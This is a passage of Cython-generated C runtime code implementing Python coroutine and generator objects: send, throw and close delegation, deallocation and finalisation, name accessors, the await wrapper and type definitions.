        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_AsyncGen_USED
        if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
            ret = __Pyx_async_gen_asend_send(yf, value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03050000 && defined(PyCoro_CheckExact) && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyCoro_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        {
            if (value == Py_None)
                ret = Py_TYPE(yf)->tp_iternext(yf);
            else
                ret = __Pyx_PyObject_CallMethod1(yf, __pyx_n_s_send, value);
        }
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        retval = __Pyx_Coroutine_FinishDelegation(gen);
    } else {
        retval = __Pyx_Coroutine_SendEx(gen, value, 0);
    }
    return __Pyx_Coroutine_MethodReturn(self, retval);
}
static int __Pyx_Coroutine_CloseIter(__pyx_CoroutineObject *gen, PyObject *yf) {
    PyObject *retval = NULL;
    int err = 0;
    #ifdef __Pyx_Generator_USED
    if (__Pyx_Generator_CheckExact(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_Coroutine_USED
    if (__Pyx_Coroutine_Check(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    if (__Pyx_CoroutineAwait_CheckExact(yf)) {
        retval = __Pyx_CoroutineAwait_Close((__pyx_CoroutineAwaitObject*)yf, NULL);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_AsyncGen_USED
    if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
        retval = __Pyx_async_gen_asend_close(yf, NULL);
    } else
    if (__pyx_PyAsyncGenAThrow_CheckExact(yf)) {
        retval = __Pyx_async_gen_athrow_close(yf, NULL);
    } else
    #endif
    {
        PyObject *meth;
        gen->is_running = 1;
        meth = __Pyx_PyObject_GetAttrStr(yf, __pyx_n_s_close);
        if (unlikely(!meth)) {
            if (!PyErr_ExceptionMatches(PyExc_AttributeError)) {
                PyErr_WriteUnraisable(yf);
            }
            PyErr_Clear();
        } else {
            retval = PyObject_CallFunction(meth, NULL);
            Py_DECREF(meth);
            if (!retval)
                err = -1;
        }
        gen->is_running = 0;
    }
    Py_XDECREF(retval);
    return err;
}
static PyObject *__Pyx_Generator_Next(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Generator_Next(yf);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, NULL);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, Py_None);
        } else
        #endif
            ret = Py_TYPE(yf)->tp_iternext(yf);
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        return __Pyx_Coroutine_FinishDelegation(gen);
    }
    return __Pyx_Coroutine_SendEx(gen, Py_None, 0);
}
static PyObject *__Pyx_Coroutine_Close_Method(PyObject *self, CYTHON_UNUSED PyObject *arg) {
    return __Pyx_Coroutine_Close(self);
}
static PyObject *__Pyx_Coroutine_Close(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *retval, *raised_exception;
    PyObject *yf = gen->yieldfrom;
    int err = 0;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        Py_INCREF(yf);
        err = __Pyx_Coroutine_CloseIter(gen, yf);
        __Pyx_Coroutine_Undelegate(gen);
        Py_DECREF(yf);
    }
    if (err == 0)
        PyErr_SetNone(PyExc_GeneratorExit);
    retval = __Pyx_Coroutine_SendEx(gen, NULL, 1);
    if (unlikely(retval)) {
        const char *msg;
        Py_DECREF(retval);
        if ((0)) {
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_Coroutine_Check(self)) {
            msg = "coroutine ignored GeneratorExit";
        #endif
        #ifdef __Pyx_AsyncGen_USED
        } else if (__Pyx_AsyncGen_CheckExact(self)) {
#if PY_VERSION_HEX < 0x03060000
            msg = "async generator ignored GeneratorExit - might require Python 3.6+ finalisation (PEP 525)";
#else
            msg = "async generator ignored GeneratorExit";
#endif
        #endif
        } else {
            msg = "generator ignored GeneratorExit";
        }
        PyErr_SetString(PyExc_RuntimeError, msg);
        return NULL;
    }
    raised_exception = PyErr_Occurred();
    if (likely(!raised_exception || __Pyx_PyErr_GivenExceptionMatches2(raised_exception, PyExc_GeneratorExit, PyExc_StopIteration))) {
        if (raised_exception) PyErr_Clear();
        Py_INCREF(Py_None);
        return Py_None;
    }
    return NULL;
}
static PyObject *__Pyx__Coroutine_Throw(PyObject *self, PyObject *typ, PyObject *val, PyObject *tb,
                                        PyObject *args, int close_on_genexit) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        Py_INCREF(yf);
        if (__Pyx_PyErr_GivenExceptionMatches(typ, PyExc_GeneratorExit) && close_on_genexit) {
            int err = __Pyx_Coroutine_CloseIter(gen, yf);
            Py_DECREF(yf);
            __Pyx_Coroutine_Undelegate(gen);
            if (err < 0)
                return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
            goto throw_here;
        }
        gen->is_running = 1;
        if (0
        #ifdef __Pyx_Generator_USED
            || __Pyx_Generator_CheckExact(yf)
        #endif
        #ifdef __Pyx_Coroutine_USED
            || __Pyx_Coroutine_Check(yf)
        #endif
            ) {
            ret = __Pyx__Coroutine_Throw(yf, typ, val, tb, args, close_on_genexit);
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_CoroutineAwait_CheckExact(yf)) {
            ret = __Pyx__Coroutine_Throw(((__pyx_CoroutineAwaitObject*)yf)->coroutine, typ, val, tb, args, close_on_genexit);
        #endif
        } else {
            PyObject *meth = __Pyx_PyObject_GetAttrStr(yf, __pyx_n_s_throw);
            if (unlikely(!meth)) {
                Py_DECREF(yf);
                if (!PyErr_ExceptionMatches(PyExc_AttributeError)) {
                    gen->is_running = 0;
                    return NULL;
                }
                PyErr_Clear();
                __Pyx_Coroutine_Undelegate(gen);
                gen->is_running = 0;
                goto throw_here;
            }
            if (likely(args)) {
                ret = PyObject_CallObject(meth, args);
            } else {
                ret = PyObject_CallFunctionObjArgs(meth, typ, val, tb, NULL);
            }
            Py_DECREF(meth);
        }
        gen->is_running = 0;
        Py_DECREF(yf);
        if (!ret) {
            ret = __Pyx_Coroutine_FinishDelegation(gen);
        }
        return __Pyx_Coroutine_MethodReturn(self, ret);
    }
throw_here:
    __Pyx_Raise(typ, val, tb, NULL);
    return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
}
static PyObject *__Pyx_Coroutine_Throw(PyObject *self, PyObject *args) {
    PyObject *typ;
    PyObject *val = NULL;
    PyObject *tb = NULL;
    if (!PyArg_UnpackTuple(args, (char *)"throw", 1, 3, &typ, &val, &tb))
        return NULL;
    return __Pyx__Coroutine_Throw(self, typ, val, tb, args, 1);
}
static CYTHON_INLINE int __Pyx_Coroutine_traverse_excstate(__Pyx_ExcInfoStruct *exc_state, visitproc visit, void *arg) {
    Py_VISIT(exc_state->exc_type);
    Py_VISIT(exc_state->exc_value);
    Py_VISIT(exc_state->exc_traceback);
    return 0;
}
static int __Pyx_Coroutine_traverse(__pyx_CoroutineObject *gen, visitproc visit, void *arg) {
    Py_VISIT(gen->closure);
    Py_VISIT(gen->classobj);
    Py_VISIT(gen->yieldfrom);
    return __Pyx_Coroutine_traverse_excstate(&gen->gi_exc_state, visit, arg);
}
static int __Pyx_Coroutine_clear(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    Py_CLEAR(gen->closure);
    Py_CLEAR(gen->classobj);
    Py_CLEAR(gen->yieldfrom);
    __Pyx_Coroutine_ExceptionClear(&gen->gi_exc_state);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        Py_CLEAR(((__pyx_PyAsyncGenObject*)gen)->ag_finalizer);
    }
#endif
    Py_CLEAR(gen->gi_code);
    Py_CLEAR(gen->gi_frame);
    Py_CLEAR(gen->gi_name);
    Py_CLEAR(gen->gi_qualname);
    Py_CLEAR(gen->gi_modulename);
    return 0;
}
static void __Pyx_Coroutine_dealloc(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject_GC_UnTrack(gen);
    if (gen->gi_weakreflist != NULL)
        PyObject_ClearWeakRefs(self);
    if (gen->resume_label >= 0) {
        PyObject_GC_Track(self);
#if PY_VERSION_HEX >= 0x030400a1 && CYTHON_USE_TP_FINALIZE
        if (PyObject_CallFinalizerFromDealloc(self))
#else
        Py_TYPE(gen)->tp_del(self);
        if (Py_REFCNT(self) > 0)
#endif
        {
            return;
        }
        PyObject_GC_UnTrack(self);
    }
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        /* We have to handle this case for asynchronous generators
           right here, because this code has to be between UNTRACK
           and GC_Del. */
        Py_CLEAR(((__pyx_PyAsyncGenObject*)self)->ag_finalizer);
    }
#endif
    __Pyx_Coroutine_clear(self);
    PyObject_GC_Del(gen);
}
static void __Pyx_Coroutine_del(PyObject *self) {
    PyObject *error_type, *error_value, *error_traceback;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    __Pyx_PyThreadState_declare
    if (gen->resume_label < 0) {
        return;
    }
#if !CYTHON_USE_TP_FINALIZE
    assert(self->ob_refcnt == 0);
    __Pyx_SET_REFCNT(self, 1);
#endif
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&error_type, &error_value, &error_traceback);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        __pyx_PyAsyncGenObject *agen = (__pyx_PyAsyncGenObject*)self;
        PyObject *finalizer = agen->ag_finalizer;
        if (finalizer && !agen->ag_closed) {
            PyObject *res = __Pyx_PyObject_CallOneArg(finalizer, self);
            if (unlikely(!res)) {
                PyErr_WriteUnraisable(self);
            } else {
                Py_DECREF(res);
            }
            __Pyx_ErrRestore(error_type, error_value, error_traceback);
            return;
        }
    }
#endif
    if (unlikely(gen->resume_label == 0 && !error_value)) {
#ifdef __Pyx_Coroutine_USED
#ifdef __Pyx_Generator_USED
    if (!__Pyx_Generator_CheckExact(self))
#endif
        {
        PyObject_GC_UnTrack(self);
#if PY_MAJOR_VERSION >= 3  || defined(PyErr_WarnFormat)
        if (unlikely(PyErr_WarnFormat(PyExc_RuntimeWarning, 1, "coroutine '%.50S' was never awaited", gen->gi_qualname) < 0))
            PyErr_WriteUnraisable(self);
#else
        {PyObject *msg;
        char *cmsg;
        #if CYTHON_COMPILING_IN_PYPY
        msg = NULL;
        cmsg = (char*) "coroutine was never awaited";
        #else
        char *cname;
        PyObject *qualname;
        qualname = gen->gi_qualname;
        cname = PyString_AS_STRING(qualname);
        msg = PyString_FromFormat("coroutine '%.50s' was never awaited", cname);
        if (unlikely(!msg)) {
            PyErr_Clear();
            cmsg = (char*) "coroutine was never awaited";
        } else {
            cmsg = PyString_AS_STRING(msg);
        }
        #endif
        if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, cmsg, 1) < 0))
            PyErr_WriteUnraisable(self);
        Py_XDECREF(msg);}
#endif
        PyObject_GC_Track(self);
        }
#endif
    } else {
        PyObject *res = __Pyx_Coroutine_Close(self);
        if (unlikely(!res)) {
            if (PyErr_Occurred())
                PyErr_WriteUnraisable(self);
        } else {
            Py_DECREF(res);
        }
    }
    __Pyx_ErrRestore(error_type, error_value, error_traceback);
#if !CYTHON_USE_TP_FINALIZE
    assert(Py_REFCNT(self) > 0);
    if (--self->ob_refcnt == 0) {
        return;
    }
    {
        Py_ssize_t refcnt = Py_REFCNT(self);
        _Py_NewReference(self);
        __Pyx_SET_REFCNT(self, refcnt);
    }
#if CYTHON_COMPILING_IN_CPYTHON
    assert(PyType_IS_GC(Py_TYPE(self)) &&
           _Py_AS_GC(self)->gc.gc_refs != _PyGC_REFS_UNTRACKED);
    _Py_DEC_REFTOTAL;
#endif
#ifdef COUNT_ALLOCS
    --Py_TYPE(self)->tp_frees;
    --Py_TYPE(self)->tp_allocs;
#endif
#endif
}
static PyObject *
__Pyx_Coroutine_get_name(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *name = self->gi_name;
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_name(__pyx_CoroutineObject *self, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = self->gi_name;
    Py_INCREF(value);
    self->gi_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_qualname(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *name = self->gi_qualname;
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_qualname(__pyx_CoroutineObject *self, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = self->gi_qualname;
    Py_INCREF(value);
    self->gi_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_frame(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *frame = self->gi_frame;
    if (!frame) {
        if (unlikely(!self->gi_code)) {
            Py_RETURN_NONE;
        }
        frame = (PyObject *) PyFrame_New(
            PyThreadState_Get(),            /*PyThreadState *tstate,*/
            (PyCodeObject*) self->gi_code,  /*PyCodeObject *code,*/
            __pyx_d,                 /*PyObject *globals,*/
            0                               /*PyObject *locals*/
        );
        if (unlikely(!frame))
            return NULL;
        self->gi_frame = frame;
    }
    Py_INCREF(frame);
    return frame;
}
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
            PyTypeObject* type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    __pyx_CoroutineObject *gen = PyObject_GC_New(__pyx_CoroutineObject, type);
    if (unlikely(!gen))
        return NULL;
    return __Pyx__Coroutine_NewInit(gen, body, code, closure, name, qualname, module_name);
}
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    gen->body = body;
    gen->closure = closure;
    Py_XINCREF(closure);
    gen->is_running = 0;
    gen->resume_label = 0;
    gen->classobj = NULL;
    gen->yieldfrom = NULL;
    gen->gi_exc_state.exc_type = NULL;
    gen->gi_exc_state.exc_value = NULL;
    gen->gi_exc_state.exc_traceback = NULL;
#if CYTHON_USE_EXC_INFO_STACK
    gen->gi_exc_state.previous_item = NULL;
#endif
    gen->gi_weakreflist = NULL;
    Py_XINCREF(qualname);
    gen->gi_qualname = qualname;
    Py_XINCREF(name);
    gen->gi_name = name;
    Py_XINCREF(module_name);
    gen->gi_modulename = module_name;
    Py_XINCREF(code);
    gen->gi_code = code;
    gen->gi_frame = NULL;
    PyObject_GC_Track(gen);
    return gen;
}

/* PyObject_GenericGetAttrNoDict */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static PyObject *__Pyx_RaiseGenericGetAttributeError(PyTypeObject *tp, PyObject *attr_name) {
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, attr_name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(attr_name));
#endif
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name) {
    PyObject *descr;
    PyTypeObject *tp = Py_TYPE(obj);
    if (unlikely(!PyString_Check(attr_name))) {
        return PyObject_GenericGetAttr(obj, attr_name);
    }
    assert(!tp->tp_dictoffset);
    descr = _PyType_Lookup(tp, attr_name);
    if (unlikely(!descr)) {
        return __Pyx_RaiseGenericGetAttributeError(tp, attr_name);
    }
    Py_INCREF(descr);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_HAVE_CLASS)))
    #endif
    {
        descrgetfunc f = Py_TYPE(descr)->tp_descr_get;
        if (unlikely(f)) {
            PyObject *res = f(descr, obj, (PyObject *)tp);
            Py_DECREF(descr);
            return res;
        }
    }
    return descr;
}
#endif

/* PatchModuleWithCoroutine */
static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    int result;
    PyObject *globals, *result_obj;
    globals = PyDict_New();  if (unlikely(!globals)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_coroutine_type",
    #ifdef __Pyx_Coroutine_USED
        (PyObject*)__pyx_CoroutineType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_generator_type",
    #ifdef __Pyx_Generator_USED
        (PyObject*)__pyx_GeneratorType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "_module", module) < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "__builtins__", __pyx_b) < 0)) goto ignore;
    result_obj = PyRun_String(py_code, Py_file_input, globals, globals);
    if (unlikely(!result_obj)) goto ignore;
    Py_DECREF(result_obj);
    Py_DECREF(globals);
    return module;
ignore:
    Py_XDECREF(globals);
    PyErr_WriteUnraisable(module);
    if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, "Cython module failed to patch module with custom type", 1) < 0)) {
        Py_DECREF(module);
        module = NULL;
    }
#else
    py_code++;
#endif
    return module;
}

/* PatchGeneratorABC */
#ifndef CYTHON_REGISTER_ABCS
#define CYTHON_REGISTER_ABCS 1
#endif
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
static PyObject* __Pyx_patch_abc_module(PyObject *module);
static PyObject* __Pyx_patch_abc_module(PyObject *module) {
    module = __Pyx_Coroutine_patch_module(
        module, ""
"if _cython_generator_type is not None:\n"
"    try: Generator = _module.Generator\n"
"    except AttributeError: pass\n"
"    else: Generator.register(_cython_generator_type)\n"
"if _cython_coroutine_type is not None:\n"
"    try: Coroutine = _module.Coroutine\n"
"    except AttributeError: pass\n"
"    else: Coroutine.register(_cython_coroutine_type)\n"
    );
    return module;
}
#endif
static int __Pyx_patch_abc(void) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    static int abc_patched = 0;
    if (CYTHON_REGISTER_ABCS && !abc_patched) {
        PyObject *module;
        module = PyImport_ImportModule((PY_MAJOR_VERSION >= 3) ? "collections.abc" : "collections");
        if (!module) {
            PyErr_WriteUnraisable(NULL);
            if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning,
                    ((PY_MAJOR_VERSION >= 3) ?
                        "Cython module failed to register with collections.abc module" :
                        "Cython module failed to register with collections module"), 1) < 0)) {
                return -1;
            }
        } else {
            module = __Pyx_patch_abc_module(module);
            abc_patched = 1;
            if (unlikely(!module))
                return -1;
            Py_DECREF(module);
        }
        module = PyImport_ImportModule("backports_abc");
        if (module) {
            module = __Pyx_patch_abc_module(module);
            Py_XDECREF(module);
        }
        if (!module) {
            PyErr_Clear();
        }
    }
#else
    if ((0)) __Pyx_Coroutine_patch_module(NULL, NULL);
#endif
    return 0;
}

/* Coroutine */
static void __Pyx_CoroutineAwait_dealloc(PyObject *self) {
    PyObject_GC_UnTrack(self);
    Py_CLEAR(((__pyx_CoroutineAwaitObject*)self)->coroutine);
    PyObject_GC_Del(self);
}
static int __Pyx_CoroutineAwait_traverse(__pyx_CoroutineAwaitObject *self, visitproc visit, void *arg) {
    Py_VISIT(self->coroutine);
    return 0;
}
static int __Pyx_CoroutineAwait_clear(__pyx_CoroutineAwaitObject *self) {
    Py_CLEAR(self->coroutine);
    return 0;
}
static PyObject *__Pyx_CoroutineAwait_Next(__pyx_CoroutineAwaitObject *self) {
    return __Pyx_Generator_Next(self->coroutine);
}
static PyObject *__Pyx_CoroutineAwait_Send(__pyx_CoroutineAwaitObject *self, PyObject *value) {
    return __Pyx_Coroutine_Send(self->coroutine, value);
}
static PyObject *__Pyx_CoroutineAwait_Throw(__pyx_CoroutineAwaitObject *self, PyObject *args) {
    return __Pyx_Coroutine_Throw(self->coroutine, args);
}
static PyObject *__Pyx_CoroutineAwait_Close(__pyx_CoroutineAwaitObject *self, CYTHON_UNUSED PyObject *arg) {
    return __Pyx_Coroutine_Close(self->coroutine);
}
static PyObject *__Pyx_CoroutineAwait_self(PyObject *self) {
    Py_INCREF(self);
    return self;
}
#if !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_CoroutineAwait_no_new(CYTHON_UNUSED PyTypeObject *type, CYTHON_UNUSED PyObject *args, CYTHON_UNUSED PyObject *kwargs) {
    PyErr_SetString(PyExc_TypeError, "cannot instantiate type, use 'await coroutine' instead");
    return NULL;
}
#endif
static PyMethodDef __pyx_CoroutineAwait_methods[] = {
    {"send", (PyCFunction) __Pyx_CoroutineAwait_Send, METH_O,
     (char*) PyDoc_STR("send(arg) -> send 'arg' into coroutine,\nreturn next yielded value or raise StopIteration.")},
    {"throw", (PyCFunction) __Pyx_CoroutineAwait_Throw, METH_VARARGS,
     (char*) PyDoc_STR("throw(typ[,val[,tb]]) -> raise exception in coroutine,\nreturn next yielded value or raise StopIteration.")},
    {"close", (PyCFunction) __Pyx_CoroutineAwait_Close, METH_NOARGS,
     (char*) PyDoc_STR("close() -> raise GeneratorExit inside coroutine.")},
    {0, 0, 0, 0}
};
static PyTypeObject __pyx_CoroutineAwaitType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "coroutine_wrapper",
    sizeof(__pyx_CoroutineAwaitObject),
    0,
    (destructor) __Pyx_CoroutineAwait_dealloc,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    PyDoc_STR("A wrapper object implementing __await__ for coroutines."),
    (traverseproc) __Pyx_CoroutineAwait_traverse,
    (inquiry) __Pyx_CoroutineAwait_clear,
    0,
    0,
    __Pyx_CoroutineAwait_self,
    (iternextfunc) __Pyx_CoroutineAwait_Next,
    __pyx_CoroutineAwait_methods,
    0                         ,
    0                      ,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if !CYTHON_COMPILING_IN_PYPY
    __Pyx_CoroutineAwait_no_new,
#else
    0,
#endif
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
#if PY_VERSION_HEX < 0x030500B1 || defined(__Pyx_IterableCoroutine_USED) || CYTHON_USE_ASYNC_SLOTS
static CYTHON_INLINE PyObject *__Pyx__Coroutine_await(PyObject *coroutine) {
    __pyx_CoroutineAwaitObject *await = PyObject_GC_New(__pyx_CoroutineAwaitObject, __pyx_CoroutineAwaitType);
    if (unlikely(!await)) return NULL;
    Py_INCREF(coroutine);
    await->coroutine = coroutine;
    PyObject_GC_Track(await);
    return (PyObject*)await;
}
#endif
#if PY_VERSION_HEX < 0x030500B1
static PyObject *__Pyx_Coroutine_await_method(PyObject *coroutine, CYTHON_UNUSED PyObject *arg) {
    return __Pyx__Coroutine_await(coroutine);
}
#endif
#if defined(__Pyx_IterableCoroutine_USED) || CYTHON_USE_ASYNC_SLOTS
static PyObject *__Pyx_Coroutine_await(PyObject *coroutine) {
    if (unlikely(!coroutine || !__Pyx_Coroutine_Check(coroutine))) {
        PyErr_SetString(PyExc_TypeError, "invalid input, expected coroutine");
        return NULL;
    }
    return __Pyx__Coroutine_await(coroutine);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_MAJOR_VERSION >= 3 && PY_VERSION_HEX < 0x030500B1
static PyObject *__Pyx_Coroutine_compare(PyObject *obj, PyObject *other, int op) {
    PyObject* result;
    switch (op) {
        case Py_EQ: result = (other == obj) ? Py_True : Py_False; break;
        case Py_NE: result = (other != obj) ? Py_True : Py_False; break;
        default:
            result = Py_NotImplemented;
    }
    Py_INCREF(result);
    return result;
}
#endif
static PyMethodDef __pyx_Coroutine_methods[] = {
    {"send", (PyCFunction) __Pyx_Coroutine_Send, METH_O,
     (char*) PyDoc_STR("send(arg) -> send 'arg' into coroutine,\nreturn next iterated value or raise StopIteration.")},
    {"throw", (PyCFunction) __Pyx_Coroutine_Throw, METH_VARARGS,
     (char*) PyDoc_STR("throw(typ[,val[,tb]]) -> raise exception in coroutine,\nreturn next iterated value or raise StopIteration.")},
    {"close", (PyCFunction) __Pyx_Coroutine_Close_Method, METH_NOARGS,
     (char*) PyDoc_STR("close() -> raise GeneratorExit inside coroutine.")},
#if PY_VERSION_HEX < 0x030500B1
    {"__await__", (PyCFunction) __Pyx_Coroutine_await_method, METH_NOARGS,
     (char*) PyDoc_STR("__await__() -> return an iterator to be used in await expression.")},
#endif
    {0, 0, 0, 0}
};
static PyMemberDef __pyx_Coroutine_memberlist[] = {
    {(char *) "cr_running", T_BOOL, offsetof(__pyx_CoroutineObject, is_running), READONLY, NULL},
    {(char*) "cr_await", T_OBJECT, offsetof(__pyx_CoroutineObject, yieldfrom), READONLY,
     (char*) PyDoc_STR("object being awaited, or None")},
    {(char*) "cr_code", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_code), READONLY, NULL},
    {(char *) "__module__", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_modulename), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0, 0, 0}
};
static PyGetSetDef __pyx_Coroutine_getsets[] = {
    {(char *) "__name__", (getter)__Pyx_Coroutine_get_name, (setter)__Pyx_Coroutine_set_name,
     (char*) PyDoc_STR("name of the coroutine"), 0},
    {(char *) "__qualname__", (getter)__Pyx_Coroutine_get_qualname, (setter)__Pyx_Coroutine_set_qualname,
     (char*) PyDoc_STR("qualified name of the coroutine"), 0},
    {(char *) "cr_frame", (getter)__Pyx_Coroutine_get_frame, NULL,
     (char*) PyDoc_STR("Frame of the coroutine"), 0},
    {0, 0, 0, 0, 0}
};
#if CYTHON_USE_ASYNC_SLOTS
static __Pyx_PyAsyncMethodsStruct __pyx_Coroutine_as_async = {
    __Pyx_Coroutine_await,
    0,
    0,
#if PY_VERSION_HEX >= 0x030A00A3
    0,
#endif
};
#endif
static PyTypeObject __pyx_CoroutineType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "coroutine",
    sizeof(__pyx_CoroutineObject),
    0,
    (destructor) __Pyx_Coroutine_dealloc,
    0,
    0,
    0,
#if CYTHON_USE_ASYNC_SLOTS
    &__pyx_Coroutine_as_async,
#else
    0,
#endif
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_HAVE_FINALIZE,
    0,
    (traverseproc) __Pyx_Coroutine_traverse,
    0,
#if CYTHON_USE_ASYNC_SLOTS && CYTHON_COMPILING_IN_CPYTHON && PY_MAJOR_VERSION >= 3 && PY_VERSION_HEX < 0x030500B1
    __Pyx_Coroutine_compare,
#else
    0,
#endif
    offsetof(__pyx_CoroutineObject, gi_weakreflist),
    0,
    0,
    __pyx_Coroutine_methods,
    __pyx_Coroutine_memberlist,
